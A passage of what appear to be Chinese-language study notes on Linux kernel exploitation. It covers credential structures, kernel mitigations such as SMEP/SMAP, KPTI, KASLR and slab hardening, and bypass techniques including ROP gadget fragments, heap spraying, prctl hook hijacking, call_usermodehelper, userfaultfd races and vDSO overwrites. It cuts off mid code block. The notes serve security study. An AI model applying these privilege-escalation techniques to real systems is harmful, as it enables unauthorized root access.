capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="comment">/* RCU deletion */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> {</span></span><br><span class="line"><span class="type">int</span> non_rcu;<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">};</span><br><span class="line">} __randomize_layout;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> {</span><br><span class="line">.usage= ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">.subscribers= ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">.magic= CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.uid= GLOBAL_ROOT_UID,</span><br><span class="line">.gid= GLOBAL_ROOT_GID,</span><br><span class="line">.suid= GLOBAL_ROOT_UID,</span><br><span class="line">.sgid= GLOBAL_ROOT_GID,</span><br><span class="line">.euid= GLOBAL_ROOT_UID,</span><br><span class="line">.egid= GLOBAL_ROOT_GID,</span><br><span class="line">.fsuid= GLOBAL_ROOT_UID,</span><br><span class="line">.fsgid= GLOBAL_ROOT_GID,</span><br><span class="line">.securebits= SECUREBITS_DEFAULT,</span><br><span class="line">.cap_inheritable= CAP_EMPTY_SET,</span><br><span class="line">.cap_permitted= CAP_FULL_SET,</span><br><span class="line">.cap_effective= CAP_FULL_SET,</span><br><span class="line">.cap_bset= CAP_FULL_SET,</span><br><span class="line">.user= INIT_USER,</span><br><span class="line">.user_ns= &amp;init_user_ns,</span><br><span class="line">.group_info= &amp;init_groups,</span><br><span class="line">.ucounts= &amp;init_ucounts,</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>Linux 6.2后取消prepare_kernel_cred(NULL)得到init_cred的方式.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">{</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (daemon)</span><br><span class="line">old = get_task_cred(daemon);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">old = get_cred(&amp;init_cred);</span><br><span class="line">...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="Defense-and-bypass"><a href="#Defense-and-bypass" class="headerlink" title="Defense and bypass"></a>Defense and bypass</h2><h3 id="SMEP-SMAP"><a href="#SMEP-SMAP" class="headerlink" title="SMEP/SMAP"></a>SMEP/SMAP</h3><p><a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.pdf?ref=hackernoon.com">https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.pdf?ref=hackernoon.com</a> 4.6.1</p><p>用户空间代码无法执行/用户空间地址无法访问<br>两种保护分别通过CR4寄存器上的20,21位使能.Linux5.1之前能关,用native_write_cr4(value)设置一下就行.之后这两位被固定了.<br><a href="https://www.phoronix.com/news/Linux-Protect-Special-CR4-Bits">https://www.phoronix.com/news/Linux-Protect-Special-CR4-Bits</a></p><blockquote><p>With a new patch now pending in the tip tree ahead of the Linux 5.1 kernel cycle, the bits for SMEP and SMAP as well as UMIP are pinned so they can no longer be easily altered. UMIP meanwhile is the User-Mode Instruction Prevention feature to prevent execution of certain instructions in higher privilege levels and its behavior too is controlled via a CR4 bit.</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">native_write_cr4</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> val)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> bits_changed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">set_register:</span><br><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">"mov %0,%%cr4"</span>: <span class="string">"+r"</span> (val) : : <span class="string">"memory"</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (static_branch_likely(&amp;cr_pinning)) {</span><br><span class="line"><span class="keyword">if</span> (unlikely((val &amp; cr4_pinned_mask) != cr4_pinned_bits)) {</span><br><span class="line">bits_changed = (val &amp; cr4_pinned_mask) ^ cr4_pinned_bits;</span><br><span class="line">val = (val &amp; ~cr4_pinned_mask) | cr4_pinned_bits;</span><br><span class="line"><span class="keyword">goto</span> set_register;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* Warn after we've corrected the changed bits. */</span></span><br><span class="line">WARN_ONCE(bits_changed, <span class="string">"pinned CR4 bits changed: 0x%lx!?\n"</span>,</span><br><span class="line">  bits_changed);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>W/R (bit 1).<br>If the access causing the page-fault exception was a write, this flag is 1; otherwise, it is 0. This flag describes<br>the access causing the page-fault exception, not the access rights specified by paging.</p></blockquote><blockquote><p>U/S (bit 2)<br>If a user-mode access caused the page-fault exception, this flag is 1; it is 0 if a supervisor-mode access did so.<br>This flag describes the access causing the page-fault exception, not the access rights specified by paging.</p></blockquote><blockquote><p> If the U/S flag (bit 2) is 0 in at least one of the paging-structure<br>entries, the address is a supervisor-mode address. Otherwise, the address is a user-mode address.</p></blockquote><blockquote><p>I/D flag (bit 4).<br>This flag is 1 if (1) the access causing the page-fault exception was an instruction fetch; and (2) either<br>(a) CR4.SMEP = 1; or (b) both (i) CR4.PAE = 1 (either PAE paging or IA-32e paging is in use); and<br>(ii) IA32_EFER.NXE = 1. Otherwise, the flag is 0. This flag describes the access causing the page-fault<br>exception, not the access rights specified by paging</p></blockquote><h4 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h4><p>管理模式执行保护,在内核页表中将所有用户空间页面标记为不可执行.防止直接修改返回地址到用户空间.可以在内核栈上ROP来绕过,溢出长度不够就栈迁移到用户空间.</p><p>重新映射页面权限是绕不了的:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311010010806.png"></p><p>我说它是内核地址不就绕了?不过感觉没啥实际意义<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311010118703.png"></p><h4 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h4><p>管理模式访问保护,在内核页表中将用户空间页面标记为不可访问(不可读写),那就纯内核栈上ROP或者内核空间内栈迁移.</p><p>STAC一下能绕.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311010017979.png"></p><blockquote><p>CR4.SMAP allows pages to be protected from supervisor-mode data accesses. If CR4.SMAP = 1, software operating<br>in supervisor mode cannot access data at linear addresses that are accessible in user mode. Software can override<br>this protection by setting EFLAGS.AC. Section 4.6 explains how access rights are determined, including the defini-<br>tion of supervisor-mode accesses and user-mode accessibility</p></blockquote><p>可惜没有STAC的gadget,手动改CR4的SMAP的ROP链长度和提权差别不大了,没意义</p><h3 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h3><p>内核页表隔离.内核页表中有完整的用户地址空间和内核地址空间,用户页表中有完整的用户地址空间和a minimal set of kernel space address(异常处理入口点啥的).<br>防止一些侧信道的攻击手法泄露内核信息.同时KPTI在内核页表中将用户空间映射为不可执行.这意味着直接返回到用户态会触发用户级的SIGSEGV.</p><p>可以修改页表权限,切换回用户页表,注册用户级signal处理函数来正常返回用户态执行代码.<br>切换回用户页表:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rdi, cr3</span><br><span class="line">or      rdi, 1000h</span><br><span class="line">mov     cr3, rdi</span><br></pre></td></tr></tbody></table></figure><p>或者用现成的swapgs_restore_regs_and_return_to_usermode+22,布置好iret的frame就行</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81200F26                 mov     rdi, rsp</span><br><span class="line">.text:FFFFFFFF81200F29                 mov     rsp, qword ptr gs:unk_6004</span><br><span class="line">.text:FFFFFFFF81200F32                 push    qword ptr [rdi+30h]</span><br><span class="line">.text:FFFFFFFF81200F35                 push    qword ptr [rdi+28h]</span><br><span class="line">.text:FFFFFFFF81200F38                 push    qword ptr [rdi+20h]</span><br><span class="line">.text:FFFFFFFF81200F3B                 push    qword ptr [rdi+18h]</span><br><span class="line">.text:FFFFFFFF81200F3E                 push    qword ptr [rdi+10h]</span><br><span class="line">.text:FFFFFFFF81200F41                 push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81200F43                 push    rax</span><br><span class="line">.text:FFFFFFFF81200F44                 jmp     short loc_FFFFFFFF81200F89</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:</span><br><span class="line">.text:FFFFFFFF81200F89                               pop     rax</span><br><span class="line">.text:FFFFFFFF81200F8A                               pop     rdi</span><br><span class="line">.text:FFFFFFFF81200F8B                               call    cs:off_FFFFFFFF82040088</span><br><span class="line">.text:FFFFFFFF81200F91                               jmp     cs:off_FFFFFFFF82040080</span><br><span class="line">...</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E0                 push    rbp</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E1                 mov     rbp, rsp</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E4                 swapgs</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E7                 pop     rbp</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E8                 retn</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF8120102E                               mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81201031                               jmp     short loc_FFFFFFFF81201067</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF81201067                               or      rdi, 1000h</span><br><span class="line">.text:FFFFFFFF8120106E                               mov     cr3, rdi</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF81200FC7                               iretq</span><br></pre></td></tr></tbody></table></figure><p>swapgs作用<br>(ps: x86-64 架构下glibc使用FS来寻址TLS,GS不使用<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311011038241.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202402271144053.png"></p><h3 id="KASLR-FG-KASLR"><a href="#KASLR-FG-KASLR" class="headerlink" title="KASLR/FG-KASLR"></a>KASLR/FG-KASLR</h3><p>内核地址空间布局随机化.泄露个地址算基址就能绕.<br>FG-KASLR使偏移也随机化了,但是有不变的.<br>[text,text+0x400dc6] 可以找点gadget<br>swapgs_restore_regs_and_return_to_usermode 不变,可以正常返回用户态<br>ksymtab, starts at text+0xf85198 不变,可以找到commit_creds prepare_kernel_cred的地址.</p><p>构造个任意读即可:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pop_rax_ret = image_base + <span class="number">0x4d11</span>UL; <span class="comment">// pop rax; ret</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> read_mem_pop1_ret = image_base + <span class="number">0x4aae</span>UL; <span class="comment">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pop_rdi_rbp_ret = image_base + <span class="number">0x38a0</span>UL; <span class="comment">// pop rdi; pop rbp; ret;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> {</span></span><br><span class="line">  <span class="type">int</span> value_offset;</span><br><span class="line">  <span class="type">int</span> name_offset;</span><br><span class="line">  <span class="type">int</span> namespace_offset;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="SLAB-ACCOUNT"><a href="#SLAB-ACCOUNT" class="headerlink" title="SLAB_ACCOUNT"></a>SLAB_ACCOUNT</h3><p>Linux 4.5版本引入,cred结构体由单独的kmem_cache分配</p><h3 id="GFP-KERNEL-ACCOUNT"><a href="#GFP-KERNEL-ACCOUNT" class="headerlink" title="GFP_KERNEL_ACCOUNT"></a>GFP_KERNEL_ACCOUNT</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312212221753.png"></p><h3 id="CONFIG-SLAB-FREELIST-RANDOM"><a href="#CONFIG-SLAB-FREELIST-RANDOM" class="headerlink" title="CONFIG_SLAB_FREELIST_RANDOM"></a>CONFIG_SLAB_FREELIST_RANDOM</h3><p>开启后在每次取slub时会随机组织freelist.<br>slab在未开启random freelist时,是从高地址开始取堆块的. <a href="https://lwn.net/Articles/685047/">https://lwn.net/Articles/685047/</a><br>slub在未开启random freelist时,是从低地址开始取堆块的</p><h3 id="CONFIG-SLAB-FREELIST-HARDENED"><a href="#CONFIG-SLAB-FREELIST-HARDENED" class="headerlink" title="CONFIG_SLAB_FREELIST_HARDENED"></a>CONFIG_SLAB_FREELIST_HARDENED</h3><p>代码来自 Linux5.11.1</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line">...</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">freelist_ptr</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *ptr,</span></span><br><span class="line"><span class="params"> <span class="type">unsigned</span> <span class="type">long</span> ptr_addr)</span></span><br><span class="line">{</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.</span></span><br><span class="line"><span class="comment"> * Normally, this doesn't cause any issues, as both set_freepointer()</span></span><br><span class="line"><span class="comment"> * and get_freepointer() are called with a pointer with the same tag.</span></span><br><span class="line"><span class="comment"> * However, there are some issues with CONFIG_SLUB_DEBUG code. For</span></span><br><span class="line"><span class="comment"> * example, when __free_slub() iterates over objects in a cache, it</span></span><br><span class="line"><span class="comment"> * passes untagged pointers to check_object(). check_object() in turns</span></span><br><span class="line"><span class="comment"> * calls get_freepointer() with an untagged pointer, which causes the</span></span><br><span class="line"><span class="comment"> * freepointer to be restored incorrectly.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">swab((<span class="type">unsigned</span> <span class="type">long</span>)kasan_reset_tag((<span class="type">void</span> *)ptr_addr)));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Hardened-Usercopy"><a href="#Hardened-Usercopy" class="headerlink" title="Hardened Usercopy"></a>Hardened Usercopy</h3><blockquote><p>Each call involves a user-space pointer and a kernel-space pointer; the user-space pointers are already checked in current kernels, so the patches only add tests for the kernel-space pointers. Those tests ensure that the address range doesn’t wrap past the end of memory, that the kernel-space pointer is not null, and that it does not point to a zero-length kmalloc() allocation (i.e. ZERO_OR_NULL_PTR() is false). Also, if the address range overlaps the kernel text (code) segment, it is rejected.</p><p>Beyond that, if the kernel-space address points into an object that has been allocated from the slab allocator, the patches ensure that what is being copied fits within the size of the object allocated. This check is performed by calling PageSlab() on the kernel address to see if it lies within a page that is handled by the slab allocator; it then calls an allocator-specific routine to determine whether the amount of data to be copied is fully within an allocated object. If the address range is not handled by the slab allocator, the patches will test that it is either within a single or compound page and that it does not span independently allocated pages.</p><p>In addition, for copies involving the stack, the copied range must fit within the current process’s stack. If there is architecture support for identifying stack frames, the copied range must fit within a single frame.</p></blockquote><p>总结一下就是:</p><ol><li>地址范围不能越过内存边界(wrap past the end of memory) </li><li>内核空间指针不为NULL</li><li>不允许指向 kmalloc 分配的零长度区域</li><li>地址范围不能与.text段重合</li><li>如果地址范围由slab管理,则地址范围需符合分配对象的大小</li><li>(接5)否则地址范围不能跨越独立分配的页面.</li><li>如果涉及到栈则不允许超出当前进程的栈空间</li></ol><p>以及一个副作用:</p><blockquote><p>If usersize is non-zero (i.e., the cache is user-space accessible), this cache is not merged with any other cache on the system.This is a major downside from the exploitation perspective since all general-purpose caches are now marked as user-space accessible in create_boot_cache() where useroffset is set to 0 and usersize is the entire cache/object size. As a result, general-purpose caches are no longer mergeable with special-purpose caches. This is true even if CONFIG_HARDENED_USERCOPY is disabled!</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311030161.png"></p><h2 id="Technique"><a href="#Technique" class="headerlink" title="Technique"></a>Technique</h2><p><a href="https://xz.aliyun.com/t/3204">从内存任意读写到权限提升</a></p><h3 id="堆喷射-Heap-Spray"><a href="#堆喷射-Heap-Spray" class="headerlink" title="堆喷射(Heap Spray)"></a>堆喷射(Heap Spray)</h3><h4 id="固定堆布局"><a href="#固定堆布局" class="headerlink" title="固定堆布局"></a>固定堆布局</h4><p>假设现在有一个堆溢出,但你目标要覆盖的对象不一定会分配到与能够发生溢出的对象前向(高地址)相邻的位置.(由于内核堆操作freelist杂乱或是开启了SLAB_FREELIST_RANDOM保护(默认开启)).<br>ps: 前提在同一个cache中</p><p>堆喷射:<br>先大量分配(spray)目标对象,清空原freelist(可选,个人见解).<br>分配发生溢出的对象.<br>大量喷射目标对象,使得目标对象并排放置,且有一个目标对象与发生溢出对象前向相邻.<br>最后正常溢出覆盖目标对象.</p><p>比如不断fork出新的进程,喷射cred结构再溢出覆盖完成提权(当然现在行不通了).<br>如何找到cred结构?PR_SET_NAME设置字符串,再在direct映射区搜索内存</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_NAME (since Linux 2.6.9)</span><br><span class="line">    Set  the name of the calling thread, using the value in the location pointed to by (char *) arg2.  The name can be up to 16 bytes long, including the terminating null byte.  (If the</span><br><span class="line">    length of the string, including the terminating null byte, exceeds 16 bytes, the string is silently truncated.)  This is the same attribute that can be set via pthread_setname_np(3)</span><br><span class="line">    and retrieved using pthread_getname_np(3).  The attribute is likewise accessible via /proc/self/task/[tid]/comm, where tid is the name of the calling thread.</span><br></pre></td></tr></tbody></table></figure><h3 id="HijackPrctl"><a href="#HijackPrctl" class="headerlink" title="HijackPrctl"></a>HijackPrctl</h3><p>《New Reliable Android Kernel Root Exploitation Techniques》</p><p>一个内核的hook,且用户态可完整控制参数.<br>注意第一个参数是个int类型,可能不能完整传递64位数据.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="type">int</span>, option, <span class="type">unsigned</span> <span class="type">long</span>, arg2, <span class="type">unsigned</span> <span class="type">long</span>, arg3,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>, arg4, <span class="type">unsigned</span> <span class="type">long</span>, arg5)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>这种漏洞利用的原理在dong-hoon you(x86)分享的《New Reliable Android Kernel Root Exploitation Techniques》中提到，这种技术被用于安卓root，可以绕过PXN防御。</p><p>首先在用户执行prctl函数时，实际上是将全部参数传递给security_task_prctl函数（\kernel\sys.c 2075）</p><p>而security_task_prctl（\security\security.c）中通过hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);将参数原封不动的传入hook进行处理，而这个hook位于内核的data段上，内核态有读写权限，因此可以通过修改这个位置劫持ptctl函数的执行流程：</p></blockquote><h3 id="call-usermodehelper"><a href="#call-usermodehelper" class="headerlink" title="call_usermodehelper"></a>call_usermodehelper</h3><p>《New Reliable Android Kernel Root Exploitation Techniques》</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">call_usermodehelper</span><span class="params">(<span class="type">char</span> * path, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp, <span class="type">int</span> wait)</span>; </span><br></pre></td></tr></tbody></table></figure><blockquote><p>call_usermodehelper，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令（注意命令中的参数要用全路径，不能用相对路径）。</p></blockquote><p>由于prctl第一个参数的截断,只能传递(四位的)用户态地址,在开启了SMAP的情况下需要通过这样的链子.</p><ol><li>mce_do_trigger –&gt; call_usermodehelper<br> <img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311091532153.png"></li><li>poweroff_work_func –&gt; run_cmd(poweroff_cmd) –&gt; call_usermodehelper<br> <img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311091545125.png"></li></ol><h4 id="提权变量总结"><a href="#提权变量总结" class="headerlink" title="提权变量总结"></a>提权变量总结</h4><p><a href="https://www.jianshu.com/p/a2259cd3e79e">call_usermodehelper提权路径变量总结</a></p><h3 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h3><p><a href="https://www.anquanke.com/post/id/253835">从强网杯 2021 线上赛题目 notebook 中浅析 userfaultfd 在 kernel pwn 中的利用</a><br>该技术主要用于条件竞争的控制,本质是利用错误处理来控制条件竞争的时序.linux5.11后需要root才能启用.可用FUSE达到相同效果.</p><p>比如这样一个条件竞争完成稳定uaf:<br>一个线程通过blob_get取得对象的读机会,在读的时候触发pagefault,进入错误处理,错误处理线程调用blob_del删除此对象,利用喷射完成堆布局,这个对象现在是一个tty结构,最后恢复执行,blob_get读取到tty结构<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311111519808.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311091656940.png"></p><h3 id="vDSO"><a href="#vDSO" class="headerlink" title="vDSO"></a>vDSO</h3><p>《Bypassing SMEP Using vDSO Overwrites》</p><p>vDSO是虚拟的共享库,实际上是把内核地址空间的某代码段映射到用户空间,修改其中的导出函数如:</p><blockquote><p>clock_gettime   0000000000000A10<br>gettimeofday    0000000000000C80<br>time    0000000000000DE0<br>getcpu  0000000000000E00<br>start   0000000000000940    [main entry]</p></blockquote><p>可劫持调用代码的root或suid进程,完成提权(其实本来就是root,只是弹个shell)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 